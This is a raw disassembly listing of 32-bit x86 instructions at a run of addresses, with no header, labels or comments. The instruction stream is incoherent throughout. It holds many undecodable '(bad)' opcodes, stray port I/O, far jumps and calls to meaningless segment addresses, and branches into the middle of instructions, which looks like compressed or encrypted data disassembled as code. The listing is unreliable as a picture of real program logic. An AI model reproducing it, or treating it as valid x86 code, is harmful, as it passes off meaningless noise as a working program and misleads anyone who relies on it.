  420da6:	cmp    ebp,eax
  420da8:	lods   eax,DWORD PTR ds:[esi]
  420da9:	mov    bh,0x47
  420dab:	pop    esi
  420dac:	test   cl,ch
  420dae:	dec    eax
  420daf:	stos   BYTE PTR es:[edi],al
  420db0:	inc    eax
  420db1:	pop    es
  420db2:	aad    0x8
  420db4:	fisubr DWORD PTR [edi-0xf]
  420db7:	xlat   BYTE PTR ds:[ebx]
  420db8:	scas   eax,DWORD PTR es:[edi]
  420db9:	aam    0xcc
  420dbb:	test   al,0x83
  420dbd:	imul   eax,esp,0xffffffd8
  420dc0:	adc    BYTE PTR [esp+edi*1+0x34],0xd4
  420dc5:	shr    BYTE PTR [ecx+eiz*8],cl
  420dc8:	cwde   
  420dc9:	ret    0x9a14
  420dcc:	sub    al,0x5b
  420dce:	jbe    0x420d9e
  420dd0:	sub    al,0x2
  420dd2:	inc    edx
  420dd3:	adc    ah,BYTE PTR [ecx]
  420dd5:	gs in  al,0x26
  420dd8:	push   0x15
  420dda:	mov    dh,0x61
  420ddc:	stos   BYTE PTR es:[edi],al
  420ddd:	mov    dl,0xa9
  420ddf:	push   esp
  420de0:	loope  0x420d69
  420de2:	dec    edi
  420de3:	icebp  
  420de4:	and    DWORD PTR [edi],ecx
  420de6:	add    al,0xdd
  420de8:	add    DWORD PTR [edx],ebx
  420dea:	cli    
  420deb:	xchg   edx,eax
  420dec:	ret    0x54ac
  420def:	cwde   
  420df0:	out    dx,eax
  420df1:	mov    eax,ds:0xe3132eff
  420df6:	scas   al,BYTE PTR es:[edi]
  420df7:	fidiv  DWORD PTR [ecx-0x58]
  420dfa:	and    cl,BYTE PTR ds:0xf2573094
  420e00:	and    cl,BYTE PTR [edi-0x4af8ed4c]
  420e06:	cmp    al,ah
  420e08:	sub    bh,ah
  420e0a:	das    
  420e0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e0c:	sub    cl,BYTE PTR [ecx]
  420e0e:	xchg   esp,eax
  420e0f:	inc    edx
  420e10:	or     esi,ecx
  420e12:	imul   edx,DWORD PTR [ebp-0x74],0xffffffac
  420e16:	pop    ebp
  420e17:	rcl    edx,0x78
  420e1a:	mov    esp,0x1995dea6
  420e1f:	jns    0x420db6
  420e21:	pop    eax
  420e22:	sub    BYTE PTR ds:[eax],dl
  420e25:	adc    BYTE PTR [edi-0x1a],ah
  420e28:	mov    ds:0xa86fd66f,eax
  420e2d:	jecxz  0x420db2
  420e2f:	inc    ecx
  420e30:	lock ja 0x420dc6
  420e33:	bound  ebp,QWORD PTR [eax+0x5]
  420e36:	add    dl,BYTE PTR [edi+0x63]
  420e39:	aam    0xfc
  420e3b:	xor    al,0xea
  420e3d:	pop    es
  420e3e:	and    eax,0x7396f9bf
  420e43:	jmp    0x4934:0xe548a5ed
  420e4a:	jg     0x420e04
  420e4c:	push   0x7bde329b
  420e51:	popf   
  420e52:	xor    ebp,DWORD PTR [edx-0x3c]
  420e55:	pusha  
  420e56:	sar    DWORD PTR [ebp-0x7a],1
  420e59:	out    dx,al
  420e5a:	xor    BYTE PTR [esp+edi*4+0x47],0x93
  420e5f:	sub    al,0x5f
  420e61:	push   eax
  420e62:	imul   DWORD PTR [esi]
  420e64:	dec    edi
  420e65:	retf   0xc829
  420e68:	jne    0x420edc
  420e6a:	and    al,0x45
  420e6c:	(bad)  
  420e6d:	dec    edi
  420e6e:	scas   eax,DWORD PTR es:[edi]
  420e6f:	xchg   edx,eax
  420e70:	mov    dl,0x1b
  420e72:	sub    ch,bh
  420e74:	inc    esp
  420e75:	mov    WORD PTR [esi+ebx*4],es
  420e78:	lods   al,BYTE PTR ds:[esi]
  420e79:	call   0xbe1c740b
  420e7e:	aad    0x9a
  420e80:	sub    ebx,ebx
  420e82:	(bad)  
  420e83:	fst    DWORD PTR [ecx]
  420e85:	pop    es
  420e86:	imul   edi,ebx,0x3ea2388f
  420e8c:	adc    ah,BYTE PTR [ebp+0xf]
  420e8f:	and    al,BYTE PTR [edx*8-0x1ce0444d]
  420e96:	jmp    0x420e90
  420e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e99:	inc    ecx
  420e9a:	lea    eax,[ebx]
  420e9c:	or     eax,0xb48e8832
  420ea1:	out    dx,eax
  420ea2:	xlat   BYTE PTR ds:[ebx]
  420ea3:	test   eax,0xec34a235
  420ea8:	push   ebx
  420ea9:	adc    al,0x3d
  420eab:	daa    
  420eac:	in     al,dx
  420ead:	in     al,0x5f
  420eaf:	mov    al,0x5f
  420eb1:	repz (bad) 
  420eb3:	out    dx,al
  420eb4:	xor    esp,eax
  420eb6:	xchg   BYTE PTR ds:0xa33a6cde,al
  420ebc:	ins    BYTE PTR es:[edi],dx
  420ebd:	cmp    BYTE PTR [edi+0x61],dl
  420ec0:	or     cl,dh
  420ec2:	xchg   ebp,eax
  420ec3:	sbb    al,0xd3
  420ec6:	push   edi
  420ec7:	fadd   QWORD PTR [ecx]
  420ec9:	test   al,0xa
  420ecb:	cld    
  420ecc:	dec    ebp
  420ecd:	shr    DWORD PTR [esi-0x30],0x3
  420ed1:	ss push esi
  420ed3:	fwait
  420ed4:	inc    esi
  420ed5:	sbb    bl,al
  420ed7:	enter  0x16cc,0xa2
  420edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420edc:	mov    ebp,DWORD PTR [ecx+0x4b]
  420edf:	sar    BYTE PTR [edx-0x27d96996],cl
  420ee5:	fsub   QWORD PTR [ecx+eiz*4]
  420ee8:	or     esi,DWORD PTR [ecx-0x25]
  420eeb:	ror    BYTE PTR [ebx-0x4e],1
  420eee:	(bad)  
  420eef:	mov    al,ds:0x4c044b4a
  420ef4:	xor    al,0x15
  420ef6:	sub    DWORD PTR [ecx+0x281bbba3],ebp
  420efc:	push   eax
  420efd:	dec    esi
  420efe:	std    
  420eff:	stc    
  420f00:	adc    ebp,DWORD PTR [ecx-0x58d42a85]
  420f06:	sub    DWORD PTR [ecx-0x647eb533],0x52
  420f0d:	popa   
  420f0e:	(bad)  
  420f10:	mov    ds:0xa4946899,al
  420f15:	js     0x420f13
  420f17:	jp     0x420f14
  420f19:	sub    al,0xb1
  420f1b:	in     eax,0x91
  420f1d:	sar    BYTE PTR [edi+0x17],cl
  420f20:	sbb    dh,BYTE PTR [ebp+0x11ca37f3]
  420f26:	jo     0x420efa
  420f28:	fld    TBYTE PTR [ebx]
  420f2a:	jecxz  0x420f55
  420f2c:	test   eax,0xf11d26a1
  420f31:	lods   eax,DWORD PTR ds:[esi]
  420f32:	inc    ebx
  420f33:	iret   
  420f34:	mov    edx,0xbc7f9f52
  420f39:	(bad)  [eax-0x29]
  420f3c:	imul   ebp,DWORD PTR [ebx],0x7
  420f3f:	jne    0x420f7a
  420f41:	push   ebx
  420f42:	jno    0x420f3a
  420f44:	or     dl,dl
  420f46:	cmc    
  420f47:	inc    edx
  420f48:	clc    
  420f49:	and    DWORD PTR [ebx-0x6610c14f],edx
  420f4f:	hlt    
  420f50:	shl    DWORD PTR [ebp+0x6c56f447],0x91
  420f57:	cmp    dl,dh
  420f59:	aaa    
  420f5a:	cs clc 
  420f5c:	sbb    BYTE PTR ds:0x58c2457c,0x48
  420f63:	ss aaa 
  420f65:	dec    ebp
  420f66:	and    eax,0xce999c0f
  420f6b:	xchg   DWORD PTR [eax],ecx
  420f6d:	fcomp  DWORD PTR [edi+0x212f00ac]
  420f73:	mov    BYTE PTR [edx+esi*8+0x52],bl
  420f77:	jl     0x420fa3
  420f79:	in     eax,0x6d
  420f7b:	push   0xbba1b564
  420f80:	mov    eax,ds:0x33be4040
  420f85:	xchg   ebx,eax
  420f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f87:	mov    al,0xee
  420f89:	neg    DWORD PTR [esi]
  420f8b:	call   0x1ecd:0x1a1de0f
  420f92:	mov    ebp,0x187f842f
  420f97:	add    ch,BYTE PTR [eax+0x504eba12]
  420f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f9e:	je     0x421019
  420fa0:	iret   
  420fa1:	out    0x18,eax
  420fa3:	out    0xba,eax
  420fa5:	pushf  
  420fa6:	out    0xc7,eax
  420fa8:	in     al,dx
  420fa9:	xlat   BYTE PTR ds:[ebx]
  420faa:	jmp    0xfc1b:0xf2306b
  420fb1:	ror    DWORD PTR [eax-0x7e],cl
  420fb4:	mov    BYTE PTR [ebp-0x20133698],bh
  420fba:	push   0xcd853153
  420fbf:	inc    edi
  420fc0:	push   0x8b2beaaa
  420fc5:	dec    ebp
  420fc6:	aam    0xe8
  420fc8:	and    al,0xdb
  420fca:	cmp    al,0xfb
  420fcc:	mov    ds:0x38f3276,al
  420fd1:	dec    edi
  420fd2:	aad    0xce
  420fd4:	jno    0x421025
  420fd6:	pop    ebx
  420fd7:	push   0x793ae86c
  420fdc:	inc    eax
  420fde:	mov    ebp,0x5995ad2b
  420fe3:	daa    
  420fe4:	adc    eax,0x32c9f67
  420fe9:	les    eax,FWORD PTR [eax]
  420feb:	pop    esp
  420fec:	(bad)  
  420fed:	in     al,0x7
  420fef:	inc    DWORD PTR [edx+0xd]
  420ff2:	cmp    eax,0x1ffba0ed
  420ff7:	faddp  st(6),st
  420ff9:	ds or  ebx,0xcbc25f50
  421000:	xor    al,0xc
  421002:	jmp    0x42f9a2ca
  421007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421008:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42100a:	arpl   WORD PTR [esp+esi*1],dx
  42100d:	add    ecx,DWORD PTR [esp+edx*1-0x3c]
  421011:	call   0x6204:0x2d9c73d0
  421018:	in     al,0x47
  42101a:	jmp    FWORD PTR [edi-0x3b]
  42101d:	out    0x83,eax
  42101f:	into   
  421020:	adc    bl,dl
  421022:	loopne 0x421087
  421024:	test   al,0xcc
  421026:	cwde   
  421027:	inc    edx
  421028:	add    DWORD PTR [ebx-0x57],ecx
  42102b:	test   bl,al
  42102d:	push   esp
  42102e:	xchg   edi,eax
  42102f:	xor    cl,ah
  421031:	enter  0x190f,0x22
  421035:	dec    esp
  421036:	and    esi,DWORD PTR [edi+0x1a3726cf]
  42103c:	popa   
  42103d:	and    DWORD PTR [ecx],ebp
  42103f:	aad    0x54
  421041:	push   ecx
  421042:	imul   esp,DWORD PTR [ebp-0x68d54b4d],0x5c
  421049:	sar    DWORD PTR [eax-0x35],1
  42104c:	cs inc ebx
  42104e:	xor    al,0xdb
  421050:	in     eax,dx
  421051:	gs dec ecx
  421053:	adc    edi,eax
  421055:	sub    cl,dh
  421057:	mov    ds:0x291e0960,eax
  42105c:	mov    ds:0x81da387c,al
  421061:	rol    BYTE PTR [ebx+0x3c],0xab
  421065:	repnz cmp al,0x63
  421068:	shr    BYTE PTR [edx-0xd],cl
  42106b:	jle    0x421044
  42106d:	sbb    dh,BYTE PTR [eax-0x6031d889]
  421073:	xchg   ebx,eax
  421074:	lods   al,BYTE PTR ds:[esi]
  421075:	push   edi
  421076:	or     BYTE PTR [ecx-0x7a962029],0xb9
  42107d:	dec    BYTE PTR [eax]
  42107f:	jb     0x4210a3
  421081:	inc    ebx
  421082:	repnz pop es
  421084:	mov    eax,0xa65378ad
  421089:	nop
  42108a:	or     dh,BYTE PTR [eax+0x342c339a]
  421090:	rcl    esi,1
  421092:	jg     0x4210e5
  421094:	gs ret 0x7adb
  421098:	jne    0x421108
  42109a:	jge    0x421099
  42109c:	enter  0x197c,0x84
  4210a0:	push   0xffffff98
  4210a2:	pushf  
  4210a3:	jp     0x4210c0
  4210a5:	rcl    BYTE PTR [esi+0x22],0x7d
  4210a9:	ror    dh,0x37
  4210ac:	test   BYTE PTR [edi],0xb5
  4210af:	xchg   ecx,eax
  4210b0:	pop    esp
  4210b1:	out    dx,eax
  4210b2:	push   eax
  4210b3:	mov    al,0x5b
  4210b5:	scas   eax,DWORD PTR es:[edi]
  4210b6:	cmp    BYTE PTR [esi+0x1cec0921],ch
  4210bc:	loope  0x4210ef
  4210be:	mov    WORD PTR ds:0xb5c523a6,?
  4210c4:	inc    esp
  4210c5:	mov    esp,esp
  4210c7:	mov    ebx,0x395b38d7
  4210cc:	pop    esi
  4210cd:	mov    WORD PTR [ebp+0x3346e30f],cs
  4210d3:	out    dx,al
  4210d4:	pop    ebp
  4210d5:	test   eax,0xe36f60cc
  4210da:	adc    ch,BYTE PTR [ebp+0x305e7390]
  4210e0:	or     al,bl
  4210e2:	or     ebx,DWORD PTR [esi-0x69]
  4210e5:	mov    bl,0x58
  4210e7:	in     eax,0xa8
  4210e9:	pusha  
  4210ea:	adc    DWORD PTR [ebx+0x60],0x9e6f3416
  4210f1:	xchg   edi,eax
  4210f2:	addr16 pop ebp
  4210f4:	xor    DWORD PTR [ebx+0x4c],ebx
  4210f7:	in     eax,0xab
  4210f9:	mov    DWORD PTR [esi+eax*1-0x79313f50],edi
  421100:	pop    edi
  421102:	das    
  421103:	inc    edi
  421104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421105:	nop
  421106:	mov    BYTE PTR [esi+0x69],0xc1
  42110a:	mov    edi,0x667d574a
  42110f:	mov    WORD PTR [edx+ebp*4-0x12e81d87],es
  421116:	add    edx,edi
  421118:	sbb    bl,ah
  42111a:	jo     0x421104
  42111c:	arpl   WORD PTR gs:[edi-0x68],ax
  421120:	div    DWORD PTR [eax+0x26]
  421123:	mov    DWORD PTR [ebp-0x74],0x7cbed202
  42112a:	xor    bh,BYTE PTR [ecx-0x79]
  42112d:	jmp    0x4210b8
  42112f:	xor    ebx,edi
  421131:	push   esp
  421132:	push   esi
  421133:	loop   0x42118c
  421135:	aas    
  421136:	shr    esp,cl
  421138:	pop    esp
  421139:	xor    bh,BYTE PTR [edi]
  42113b:	inc    eax
  42113c:	daa    
  42113d:	sub    BYTE PTR [eax-0x425d465],dh
  421143:	lods   al,BYTE PTR ds:[esi]
  421144:	cmp    eax,DWORD PTR [eax]
  421146:	push   ebx
  421147:	mov    BYTE PTR [ebx],cl
  421149:	cwde   
  42114a:	mov    bh,0x68
  42114c:	aad    0x6b
  42114e:	fimul  DWORD PTR [ebp+0x45]
  421151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421152:	lds    esi,FWORD PTR [ebp+0x3e3e7274]
  421158:	and    DWORD PTR [eax+0x11],edx
  42115b:	hlt    
  42115c:	sbb    eax,0x147bd158
  421161:	fcomp  QWORD PTR [ecx-0x6b76cc29]
  421167:	les    ebp,FWORD PTR [ebx-0x1717e4f8]
  42116d:	xor    eax,0x2dab4b74
  421172:	shr    BYTE PTR [eax],cl
  421174:	cmc    
  421175:	mov    bl,0x2f
  421177:	push   cs
  421178:	mov    al,0x0
  42117a:	js     0x4211b1
  42117c:	sti    
  42117d:	dec    esp
  42117e:	dec    edi
  42117f:	jne    0x421116
  421181:	jbe    0x42115f
  421183:	xchg   edi,eax
  421184:	in     eax,dx
  421185:	xchg   esi,eax
  421186:	add    eax,0x73317a78
  42118b:	cmp    al,0x31
  42118d:	xor    eax,0x16695c19
  421192:	push   ebx
  421193:	xchg   ecx,eax
  421194:	repnz xor DWORD PTR [edi+0x79dc31ba],ecx
  42119b:	icebp  
  42119c:	jbe    0x42119c
  42119e:	sahf   
  42119f:	jo     0x421154
  4211a1:	sub    dl,0xfd
  4211a4:	fst    DWORD PTR [esi+ebp*4-0x5cd0ea88]
  4211ab:	ds pop es
  4211ad:	lods   al,BYTE PTR ds:[esi]
  4211ae:	aas    
  4211af:	cwde   
  4211b0:	xor    al,0xbb
  4211b2:	pop    edi
  4211b3:	sbb    esi,DWORD PTR [esi-0x171d665e]
  4211b9:	mov    edi,0xa78fd83a
  4211be:	dec    esp
  4211bf:	icebp  
  4211c0:	aaa    
  4211c1:	inc    ebx
  4211c2:	cmp    ebp,0x5e
  4211c5:	push   ds
  4211c6:	push   eax
  4211c7:	and    eax,0x24b9a095
  4211cc:	outs   dx,DWORD PTR ds:[esi]
  4211cd:	shr    DWORD PTR [ecx-0x691e2f80],cl
  4211d3:	icebp  
  4211d4:	jle    0x4211ed
  4211d6:	push   es
  4211d7:	mov    esp,0xe4eb84bb
  4211dc:	(bad)  
  4211dd:	push   0xffffffcc
  4211df:	loope  0x4211a6
  4211e1:	(bad)  
  4211e3:	sub    DWORD PTR [edx+0x55],ecx
  4211e6:	push   ebx
  4211e7:	or     bh,BYTE PTR [ecx+0x78164de8]
  4211ed:	std    
  4211ee:	aas    
  4211ef:	mov    bl,0xda
  4211f1:	dec    esi
  4211f2:	pop    edi
  4211f3:	cwde   
  4211f4:	mov    al,0x83
  4211f6:	ds push edi
  4211f8:	add    eax,0x46cac75f
  4211fd:	sahf   
  4211fe:	stos   BYTE PTR es:[edi],al
  4211ff:	aas    
  421200:	jge    0x4211fb
  421202:	mov    edi,0xbc3e285c
  421207:	pushf  
  421208:	ret    
  421209:	inc    edx
  42120a:	add    ecx,ecx
  42120c:	in     eax,dx
  42120d:	xchg   esp,eax
  42120e:	cdq    
  42120f:	adc    cl,ch
  421211:	push   edx
  421212:	and    DWORD PTR [edx],eax
  421214:	sub    BYTE PTR [esp+edx*4-0x18],bl
  421218:	sbb    eax,0xade8718e
  42121d:	sar    DWORD PTR [ecx+0x20],cl
  421220:	ins    BYTE PTR es:[edi],dx
  421221:	inc    ebp
  421222:	sar    BYTE PTR [edi-0x39f02a66],1
  421228:	daa    
  421229:	push   0xffffffc3
  42122b:	mov    cl,0xa8
  42122d:	cmp    ebp,DWORD PTR [eax-0x7]
  421230:	pop    edx
  421231:	dec    ebp
  421232:	out    dx,al
  421233:	cmc    
  421234:	pop    esi
  421235:	jecxz  0x42128b
  421237:	pop    ebx
  421238:	out    0xba,al
  42123a:	aas    
  42123b:	rcr    DWORD PTR [ebx+0x7a625980],0x4b
  421242:	sbb    al,0xad
  421244:	cdq    
  421245:	add    bl,BYTE PTR [esi+edx*4]
  421248:	mov    al,0x92
  42124a:	sub    edx,edx
  42124c:	xchg   DWORD PTR [edx+0x4e],esp
  42124f:	pop    ds
  421250:	gs adc dl,0xff
  421254:	mov    esp,0x446c5d23
  421259:	pop    ss
  42125a:	(bad)  
  42125c:	dec    esi
  42125d:	test   eax,0x561c5e73
  421262:	sub    BYTE PTR [esi],ah
  421264:	call   0xc7becc0e
  421269:	cmc    
  42126a:	mov    bl,0x46
  42126c:	cmp    edi,DWORD PTR [edi+ebx*1]
  42126f:	pop    ds
  421270:	int3   
  421271:	mov    esp,0xa164f7b5
  421276:	push   0x5d76f386
  42127b:	lock repnz xor al,0x6c
  42127f:	or     edx,DWORD PTR [edi-0x41]
  421282:	aaa    
  421283:	nop
  421284:	pop    eax
  421285:	mov    ebp,0x87f5bd71
  42128a:	test   eax,0x7363951
  42128f:	fwait
  421290:	jmp    DWORD PTR [edx-0x3df7f8ad]
  421296:	jle    0x4212b2
  421298:	adc    BYTE PTR ds:0x6d8bd82e,dh
  42129e:	cmp    eax,0x2b59f83a
  4212a3:	imul   ebx,ebx,0x5a
  4212a6:	mov    ss,WORD PTR [esi]
  4212a8:	mov    ebp,0xab5f543b
  4212ad:	mov    al,ds:0x147634f1
  4212b2:	js     0x42132b
  4212b4:	ins    DWORD PTR es:[edi],dx
  4212b5:	in     eax,dx
  4212b6:	ins    BYTE PTR es:[edi],dx
  4212b7:	pop    ss
  4212b8:	cmc    
  4212b9:	push   cs
  4212ba:	les    ebx,FWORD PTR [ebp+0x27]
  4212bd:	mov    ds:0x2d362f1f,eax
  4212c2:	(bad)  
  4212c3:	into   
  4212c4:	(bad)  
  4212c5:	xor    BYTE PTR [esi],al
  4212c7:	sbb    DWORD PTR [esi-0x7d265864],eax
  4212cd:	push   ebp
  4212ce:	fmul   QWORD PTR [ebx+0xdda209]
  4212d4:	xor    eax,0xffffff9c
  4212d7:	in     al,dx
  4212d8:	pop    ecx
  4212d9:	mov    dl,0x13
  4212db:	pop    eax
  4212dc:	ins    DWORD PTR es:[edi],dx
  4212dd:	shl    DWORD PTR [eax],0x22
  4212e0:	dec    ebx
  4212e1:	jmp    0x4212db
  4212e3:	test   eax,0x1fcc60ba
  4212e8:	loope  0x421316
  4212ea:	sti    
  4212eb:	inc    edi
  4212ec:	jb     0x421324
  4212ee:	out    0x6d,eax
  4212f0:	push   edi
  4212f1:	push   ecx
  4212f2:	outs   dx,DWORD PTR ds:[esi]
  4212f3:	repz bound esp,QWORD PTR [edi+0x33c98b52]
  4212fa:	fs inc eax
  4212fc:	call   0xd85c:0x66dae4ff
  421303:	pop    esp
  421304:	bound  edx,QWORD PTR [ecx-0x5d17e683]
  42130a:	or     al,0x34
  42130c:	cmp    ecx,edi
  42130e:	cmp    DWORD PTR [edi-0x1f],0xfffffff7
  421312:	and    al,0xd2
  421314:	mov    ecx,DWORD PTR [edx-0x225c5ec2]
  42131a:	or     ecx,DWORD PTR [esi+0x1e]
  42131d:	dec    eax
  42131e:	xchg   DWORD PTR [eax+0x7a],edx
  421321:	mov    esp,0x602c20e4
  421326:	mov    ebp,0x2aa77d5d
  42132b:	nop
  42132c:	jbe    0x421342
  42132e:	lds    esi,FWORD PTR [ebp-0x8]
  421331:	out    dx,al
  421332:	jnp    0x4213a5
  421334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421335:	aas    
  421336:	mov    ebp,0x4e0ba1a4
  42133b:	neg    BYTE PTR [esi-0x50310baf]
  421341:	call   0x54062b0a
  421346:	stos   DWORD PTR es:[edi],eax
  421347:	loopne 0x4212e5
  421349:	xchg   bh,cl
  42134b:	cld    
  42134c:	js     0x42135f
  42134e:	cmp    al,0xb4
  421350:	ficomp WORD PTR [edx]
  421352:	js     0x421304
  421354:	inc    ebx
  421355:	jbe    0x42138c
  421357:	ins    BYTE PTR es:[edi],dx
  421358:	aaa    
  421359:	mov    bh,0x3d
  42135b:	xchg   esp,eax
  42135c:	out    0xae,al
  42135e:	ret    0x4093
  421361:	aad    0x2a
  421363:	aad    0xf2
  421365:	mov    cl,0x36
  421367:	popf   
  421368:	add    bl,BYTE PTR [eax]
  42136a:	outs   dx,BYTE PTR ds:[esi]
  42136b:	fs out 0xc4,al
  42136e:	xor    eax,0xca4a370f
  421373:	imul   esp,DWORD PTR [ebx],0x39444886
  421379:	sbb    al,BYTE PTR [edi+eiz*8+0x0]
  42137d:	add    al,BYTE PTR [edx-0x68]
  421380:	adc    ch,0xec
  421383:	dec    ebx
  421384:	add    DWORD PTR [edx-0x4a4c9c6f],ebp
  42138a:	jae    0x421369
  42138c:	pop    edi
  42138d:	and    edi,esi
  42138f:	pop    esi
  421390:	add    eax,0xb7e1093e
  421395:	or     esi,ebx
  421397:	xchg   esp,eax
  421398:	push   edi
  421399:	lods   eax,DWORD PTR ds:[esi]
  42139a:	ret    0x5cdd
  42139d:	leave  
  42139e:	fwait
  42139f:	test   BYTE PTR [ebx-0x55e37646],dh
  4213a5:	push   0x72
  4213a7:	rol    dl,cl
  4213a9:	aam    0xfa
  4213ab:	sbb    eax,0x1d7fc6d3
  4213b0:	pop    eax
  4213b1:	mov    ah,0x4e
  4213b3:	mov    ds:0x75bc3539,eax
  4213b8:	push   esp
  4213b9:	(bad)  
  4213ba:	scas   al,BYTE PTR es:[edi]
  4213bb:	pop    ebx
  4213bc:	out    0x95,eax
  4213be:	in     eax,0xd6
  4213c0:	inc    edx
  4213c1:	dec    ecx
  4213c2:	movd   DWORD PTR [edx],mm3
  4213c5:	mov    esp,0x7f37dbe0
  4213ca:	aas    
  4213cb:	jo     0x4213c7
  4213cd:	daa    
  4213ce:	push   0xffffffc6
  4213d0:	or     BYTE PTR [edx-0x5c],cl
  4213d3:	and    al,0xf2
  4213d5:	jbe    0x4213ae
  4213d7:	pop    ebx
  4213d8:	loop   0x4213e2
  4213da:	je     0x4213cc
  4213dc:	outs   dx,BYTE PTR ds:[esi]
  4213dd:	jno    0x42139e
  4213df:	mov    ds:0x3ed16807,eax
  4213e4:	xor    eax,0xbd4ddd44
  4213e9:	add    dh,BYTE PTR [edx+0x1]
  4213ec:	enter  0x7150,0x5
  4213f0:	dec    edx
  4213f1:	pop    ebp
  4213f2:	mov    bl,0x93
  4213f4:	iret   
  4213f5:	sbb    esi,ebx
  4213f7:	pop    edi
  4213f8:	sub    al,0x11
  4213fa:	sub    eax,0xacf3c692
  4213ff:	push   0xffffffbf
  421401:	stos   BYTE PTR es:[edi],al
  421402:	lods   al,BYTE PTR ds:[esi]
  421403:	mov    bh,0x94
  421405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421406:	shl    DWORD PTR [esi+ebp*4-0x216ab154],cl
  42140d:	add    dl,al
  42140f:	xlat   BYTE PTR ds:[ebx]
  421410:	int3   
  421411:	pushf  
  421412:	mov    eax,0x9f121bce
  421417:	inc    esp
  421418:	and    cl,ch
  42141a:	mov    eax,ds:0xb20565c0
  42141f:	ret    
  421420:	jecxz  0x421419
  421422:	fld    DWORD PTR [ebp+0x4b]
  421425:	pop    esi
  421426:	fisubr WORD PTR [eax+0x41]
  421429:	adc    al,0x47
  42142b:	dec    edx
  42142d:	retf   0xd373
  421430:	mov    esp,0xbd5195dc
  421435:	xor    eax,0xe091d327
  42143a:	mov    al,0xb3
  42143c:	push   eax
  42143d:	stos   BYTE PTR es:[edi],al
  42143e:	push   ebx
  42143f:	mov    edx,ds
  421441:	inc    ebp
  421442:	or     DWORD PTR [esi+0x4f],ebx
  421445:	je     0x421462
  421447:	or     ecx,DWORD PTR [edx+0x2]
  42144a:	dec    eax
  42144b:	dec    ebp
  42144c:	idiv   ch
  42144e:	test   BYTE PTR [edx],dl
  421450:	pshufw mm1,QWORD PTR [esi-0x4c],0xa4
  421455:	jmp    0x421451
  421457:	lods   eax,DWORD PTR ds:[esi]
  421458:	inc    ebp
  421459:	pop    edx
  42145a:	nop
  42145b:	push   esp
  42145c:	les    edi,FWORD PTR [ecx]
  42145e:	inc    edi
  42145f:	mov    esi,?
  421461:	add    eax,0x9e897ff9
  421466:	or     BYTE PTR [esi+0x76],0x57
  42146a:	mov    ebp,DWORD PTR [ebx+0x24]
  42146d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42146e:	xchg   ebp,eax
  42146f:	jl     0x421400
  421471:	adc    dh,bl
  421473:	lahf   
  421474:	mov    edi,0xf03e61b7
  421479:	loopne 0x421441
  42147b:	hlt    
  42147c:	setge  BYTE PTR [eiz*4-0x25043350]
  421484:	push   ecx
  421485:	push   eax
  421486:	repnz fucomp st(1)
  421489:	enter  0x4cf6,0xee
  42148d:	sbb    al,0x7
  42148f:	cmc    
  421490:	pop    ss
  421491:	aaa    
  421492:	inc    ecx
  421493:	mov    ebx,0xe5203204
  421498:	inc    esp
  421499:	retf   
  42149a:	jnp    0x4214d2
  42149c:	adc    BYTE PTR gs:[edx+0x56],dl
  4214a0:	cmp    ebx,eax
  4214a2:	sbb    BYTE PTR [edx+0x5f241926],0x4f
  4214a9:	jge    0x42149d
  4214ab:	pusha  
  4214ac:	dec    BYTE PTR [edi+edi*8-0x61bde5d2]
  4214b3:	jle    0x42147e
  4214b5:	sub    al,0x80
  4214b7:	mov    fs,WORD PTR [eax+0x42]
  4214ba:	mov    ds:0x98f17aca,al
  4214bf:	leave  
  4214c0:	sub    eax,0x85e76e0
  4214c5:	test   eax,0x6cf9a784
  4214ca:	jne    0x421485
  4214cc:	test   BYTE PTR [ecx+0x4b],dh
  4214cf:	stc    
  4214d0:	stos   BYTE PTR es:[edi],al
  4214d1:	daa    
  4214d2:	test   BYTE PTR [ebx],bl
  4214d4:	jns    0x4214ad
  4214d6:	jg     0x4214f7
  4214d8:	adc    ah,bl
  4214da:	out    dx,al
  4214db:	and    cl,cl
  4214dd:	inc    ebx
  4214de:	push   ebx
  4214df:	cmp    al,0x76
  4214e1:	retf   0x70c
  4214e4:	jb     0x4214ac
  4214e6:	sub    DWORD PTR [esi-0x46],edi
  4214e9:	ja     0x4214c1
  4214eb:	jl     0x421521
  4214ed:	(bad)  
  4214ee:	cmp    ah,ch
  4214f0:	rcl    BYTE PTR [eax],1
  4214f2:	xor    al,0x26
  4214f4:	cwde   
  4214f5:	stc    
  4214f6:	xor    DWORD PTR [ecx-0x2b],esp
  4214f9:	ds loope 0x421571
  4214fc:	es and al,0x69
  4214ff:	mov    ds,WORD PTR [ebp+0x3e]
  421502:	loope  0x4214ef
  421504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421505:	push   ebx
  421506:	mov    ebp,0x7a65f1b1
  42150b:	cmp    dh,BYTE PTR [edi-0x3ab9caaf]
  421511:	(bad)  
  421512:	jmp    FWORD PTR [edx+0x33]
  421515:	ins    DWORD PTR es:[edi],dx
  421516:	mov    edi,0x921939aa
  42151b:	popa   
  42151c:	sub    al,0x21
  42151e:	fcom   QWORD PTR [eax]
  421520:	xchg   edx,eax
  421521:	out    dx,al
  421522:	add    ebp,DWORD PTR [ecx+0x54b09794]
  421528:	ins    DWORD PTR es:[edi],dx
  421529:	aaa    
  42152a:	nop
  42152b:	jmp    0x3dd:0xdc413f20
  421532:	jp     0x4214c4
  421534:	jbe    0x421550
  421536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421537:	cmp    ebp,DWORD PTR [edx+0x60719c22]
  42153d:	pop    esi
  42153e:	push   0x65de34d0
  421543:	les    esi,FWORD PTR [ecx-0x5ef8c576]
  421549:	arpl   WORD PTR ds:[ebx],di
  42154c:	add    al,0x70
  42154e:	cli    
  42154f:	into   
  421550:	std    
  421551:	into   
  421552:	mov    bl,0x0
  421554:	(bad)  
  421555:	jae    0x421559
  421557:	sti    
  421558:	(bad)  [eax+esi*8-0x38e42f93]
  42155f:	pop    ds
  421560:	add    BYTE PTR [esi],ch
